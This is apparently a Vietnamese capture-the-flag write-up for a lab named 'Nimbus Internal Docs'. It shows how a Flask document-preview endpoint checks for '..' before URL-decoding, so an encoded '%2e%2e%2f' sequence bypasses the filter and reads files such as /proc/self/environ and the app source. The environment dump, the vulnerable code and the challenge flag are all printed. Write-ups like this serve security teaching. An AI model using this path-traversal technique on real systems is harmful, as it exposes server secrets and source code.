# Nimbus Internal Docs

## ANALYZE

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

Đầu tiên thì phân tích qua , ta có được đây là 1 trang web dùng để đọc các file tài liệu giành cho nhân viên của 1 công ti

và chúng ta biết được 1 số endpoint khả dụng của trang web này :&#x20;

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

ta sẽ tập trung chú ý vào&#x20;

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

tiếp theo , ta tiến hành trải nghiệm trang web như 1 user thường

ta nhận thấy feature này có thể giúp cho user đọc các file thông qua việc nhập đường dẫn tới file đó , ví dụ như `kb/employee-handbook.txt`

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

Tiếp theo ta cùng tập trung tới : endpoint `/support/tool?asset=kb%2Femployee-handbook.txt`

### giả thiết

Giờ là lúc đặt giả thiết cho nó , sẽ ra sao  , nếu ta thay đổi giá trị đầu vào của param \``` asset` `` thành 1 đường dẫn của các file nội bộ khác , hay thậm trí là src code ?

### thử nghiệm

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

Và ta nhận thấy nó đã có tồn tại filter để chống path traversal

Tôi sẽ tiến hành 1 số cách bypass cở bản của lỗ hổng này&#x20;

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

Và  Boom! tôi đã thành công bypass filter với kĩ thuật double encode url

<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

Tiếp theo ta sẽ tiến hành 1 số bước để đọc các file quan trọng như `/proc/self/environ` hay mã nguồn chẳng hạn



<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

```
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.43.0.1:443

HOSTNAME=team-11-20-nimbus-internal-docs-1775877034-job-z27n6
SHLVL=1
HOME=/home/appuser

TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_PORT_3333_TCP_ADDR=10.43.155.248
PYTHONUNBUFFERED=1

GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D68469D6

TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_PORT_3333_TCP_PORT=3333
PYTHON_SHA256=72179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625

TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_SERVICE_HOST=10.43.155.248
TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_PORT_3333_TCP_PROTO=tcp

TMPDIR=/tmp
PYTHONDONTWRITEBYTECODE=1

TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_SERVICE_PORT=3333
TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_PORT=tcp://10.43.155.248:3333

KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_PORT_3333_TCP=tcp://10.43.155.248:3333

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp

LANG=C.UTF-8
PYTHON_VERSION=3.11.15

TEAM_11_20_NIMBUS_INTERNAL_DOCS_1775877034_SVC_SERVICE_PORT_TCP=3333

KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443

KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_HOST=10.43.0.1

PWD=/app
```

ở đây ta thu được nơi chứa src code chính là `/app`

### rootcause

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

```python
import os
from urllib.parse import unquote

from flask import Flask, Response, abort, render_template, request
from flask.typing import ResponseReturnValue


app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PUBLIC_DIR = os.path.join(BASE_DIR, "public")
KB_DIR = os.path.join(PUBLIC_DIR, "kb")
DEFAULT_ASSET = "kb/employee-handbook.txt"

DOCS = [
    {
        "slug": "employee-handbook",
        "title": "Employee Handbook Snapshot",
        "team": "HR",
        "asset": DEFAULT_ASSET,
        "summary": "High-level onboarding and support process updates.",
    },
    {
        "slug": "billing-release-note",
        "title": "Billing Service Release Note",
        "team": "Finance Platform",
        "asset": "kb/billing-release-note.txt",
        "summary": "Explains migration from legacy archive paths.",
    },
    {
        "slug": "ops-postmortem",
        "title": "Ops Postmortem Template",
        "team": "SRE",
        "asset": "kb/ops-postmortem-template.txt",
        "summary": "Standard format for documenting incidents and fixes.",
    },
]
DOC_INDEX = {doc["slug"]: doc for doc in DOCS}


def render_asset_preview(raw_asset: str) -> tuple[int, str]:
    # Business rule: legacy sync client sends URL-encoded relative asset keys.
    if raw_asset.startswith("/") or ".." in raw_asset:
        return 403, "blocked by path policy"

    decoded_asset = unquote(raw_asset)
    target_path = os.path.join(PUBLIC_DIR, decoded_asset)

    try:
        with open(target_path, "r", encoding="utf-8") as handle:
            return 200, handle.read()
    except FileNotFoundError:
        return 404, "file not found"
    except IsADirectoryError:
        return 400, "not a file"


@app.get("/")
def index() -> ResponseReturnValue:
    return render_template("index.html", docs=DOCS)


@app.get("/kb/<slug>")
def kb_article(slug: str) -> ResponseReturnValue:
    doc = DOC_INDEX.get(slug)
    if not doc:
        abort(404)

    target_path = os.path.join(PUBLIC_DIR, doc["asset"])
    with open(target_path, "r", encoding="utf-8") as handle:
        body = handle.read()

    return render_template("article.html", doc=doc, body=body)


@app.get("/support/tool")
def support_tool() -> ResponseReturnValue:
    asset = request.args.get("asset", DEFAULT_ASSET)
    status, content = render_asset_preview(asset)
    return render_template(
        "support_tool.html",
        asset=asset,
        status=status,
        content=content,
    )


@app.get("/support/raw")
def support_raw() -> ResponseReturnValue:
    asset = request.args.get("asset", DEFAULT_ASSET)
    status, content = render_asset_preview(asset)
    return Response(content, status=status, mimetype="text/plain")
```

```python
def render_asset_preview(raw_asset: str) -> tuple[int, str]:
    # Business rule: legacy sync client sends URL-encoded relative asset keys.
    if raw_asset.startswith("/") or ".." in raw_asset:
        return 403, "blocked by path policy"

    decoded_asset = unquote(raw_asset)
    target_path = os.path.join(PUBLIC_DIR, decoded_asset)

    try:
        with open(target_path, "r", encoding="utf-8") as handle:
            return 200, handle.read()
    except FileNotFoundError:
        return 404, "file not found"
    except IsADirectoryError:
        return 400, "not a file"
```

ở đây ta đã có được thông tin về hàm filter , nó đã check nếu cái userinput bắt đầu bằng `/` hoặc `..`

thì sẽ trả về 403

Logic lỗi:

* App kiểm tra `raw_asset` trước
* Sau đó mới `unquote(raw_asset)`
* Nên có thể bypass filter `..` bằng URL encoding

Ví dụ:

```
%2e%2e%2f
```

Ở thời điểm check:

* chuỗi không chứa literal `..`
* không bị block

Sau `unquote`:

* thành `../`

Kết quả:

* path traversal ra ngoài `PUBLIC_DIR`



## EXPLOIT

Ta đã đủ dữ kiện để giải bài&#x20;

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

và flag ko nằm ở /flag.txt , có khả năng nó nằm trong 1 thư mục nào đó , ta sẽ thử brute



<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

BOOMMM

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

## FLAG

```
FCTF{double_decode_path_traversal_3of5}
```
